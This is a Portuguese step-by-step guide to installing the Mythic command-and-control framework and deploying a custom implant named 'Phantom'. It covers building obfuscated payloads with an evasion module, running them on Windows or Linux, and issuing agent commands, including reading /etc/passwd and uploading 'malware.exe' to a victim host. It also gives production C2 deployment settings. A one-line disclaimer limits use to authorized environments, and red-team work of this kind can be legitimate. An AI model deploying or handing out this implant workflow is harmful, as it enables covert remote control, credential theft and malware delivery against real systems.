# Guia Completo: Instalação e Uso do Phantom no Mythic

## Passo 1: Instalar o Mythic Framework

```bash
# Clone o repositório do Mythic
git clone https://github.com/its-a-feature/Mythic
cd Mythic

# Instalar Docker (se necessário)
sudo ./install_docker_ubuntu.sh

# Instalar perfil C2 HTTP
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http

# Verificar instalação
sudo ./mythic-cli status
```

## Passo 2: Instalar o Agente Phantom

```bash
# Copiar o agente Phantom para o Mythic
sudo cp -r ./Payload_Types/Phantom /caminho/para/mythic/Payload_Types/

# Instalar o payload type
cd /caminho/para/mythic
sudo ./mythic-cli install folder Payload_Types/Phantom

# Verificar se foi instalado
sudo ./mythic-cli status
```

## Passo 3: Iniciar o Mythic

```bash
# Iniciar todos os serviços
sudo ./mythic-cli start

# Verificar status
sudo ./mythic-cli status

# Ver logs (se necessário)
sudo ./mythic-cli logs
```

## Passo 4: Acessar a Interface Web

1. **Abrir navegador**: https://localhost:7443
2. **Login**: mythic_admin
3. **Senha**: Veja nos logs ou use: `sudo ./mythic-cli config get admin_password`

## Passo 5: Criar um Payload Phantom

### Na Interface Web do Mythic:

1. **Ir para "Payloads"** → "Create New Payload"
2. **Selecionar "Phantom"** como Payload Type
3. **Configurar parâmetros**:
   - **server_url**: Sua URL do servidor C2
   - **sleep**: 5 (segundos)
   - **jitter**: 10 (porcentagem)
   - **user_agent**: Deixar padrão ou customizar
   - **aes_key**: Gerar uma chave AES ou deixar vazio
   - **debug**: false (para produção)

4. **Selecionar SO**: Windows ou Linux
5. **Criar payload** → Fazer download

## Passo 6: Usar o Agente

### Executar o Payload:
```bash
# Linux
chmod +x phantom_linux
./phantom_linux

# Windows
phantom_windows.exe
```

### Comandos Disponíveis:
```bash
# Executar comandos shell
shell whoami
shell ls -la
shell dir C:\

# Modificar configurações
sleep 30
jitter 25

# Operações de arquivo
download /etc/passwd
upload malware.exe C:\temp\

# Sair
exit
```

## Passo 7: Monitoramento

### No Mythic Interface:
1. **Active Callbacks**: Ver agentes conectados
2. **Task History**: Histórico de comandos
3. **File Browser**: Arquivos baixados/enviados
4. **Screenshots**: Capturas de tela (se implementado)

## Comandos Úteis do Mythic CLI

```bash
# Status dos serviços
sudo ./mythic-cli status

# Parar serviços
sudo ./mythic-cli stop

# Reiniciar
sudo ./mythic-cli restart

# Ver logs específicos
sudo ./mythic-cli logs mythic_server
sudo ./mythic-cli logs phantom

# Backup
sudo ./mythic-cli database backup

# Atualizar
sudo ./mythic-cli update
```

## Solução de Problemas

### Problema: Agente não conecta
```bash
# Verificar se o servidor está rodando
sudo ./mythic-cli status

# Verificar logs
sudo ./mythic-cli logs mythic_server

# Verificar firewall
sudo ufw status
sudo ufw allow 7443
sudo ufw allow 80
sudo ufw allow 443
```

### Problema: Build falha
```bash
# Instalar dependências Go
sudo apt install golang-go

# Verificar se garble está instalado
go install mvdan.cc/garble@latest

# Build manual
cd Payload_Types/Phantom/agent
go build -o phantom main.go evasion.go
```

### Problema: Permissões
```bash
# Ajustar permissões
sudo chown -R $USER:$USER Payload_Types/Phantom
chmod +x Payload_Types/Phantom/*.sh
```

## Configuração Avançada

### Perfil C2 Customizado:
1. **Editar**: `/opt/Mythic/C2_Profiles/http/c2_code/config.json`
2. **Configurar**:
   - URLs customizadas
   - Headers HTTP
   - Criptografia
   - Certificados SSL

### Build com Máxima Ofuscação:
```bash
cd Payload_Types/Phantom
chmod +x build_script.sh
./build_script.sh
```

### Deployment em Produção:
```bash
# Usar HTTPS com certificado válido
sudo ./mythic-cli config set nginx_use_ssl true
sudo ./mythic-cli config set nginx_cert_path /path/to/cert.pem
sudo ./mythic-cli config set nginx_key_path /path/to/key.pem

# Configurar domínio
sudo ./mythic-cli config set mythic_server_host seu-dominio.com

# Reiniciar com novas configurações
sudo ./mythic-cli restart
```

## Recursos Adicionais

- **Documentação**: https://docs.mythic-c2.net/
- **Discord**: https://discord.gg/mythic
- **GitHub**: https://github.com/its-a-feature/Mythic

## Segurança

⚠️ **IMPORTANTE**: 
- Use apenas em ambientes autorizados
- Configure firewall adequadamente
- Use HTTPS em produção
- Faça backups regulares
- Monitore logs de segurança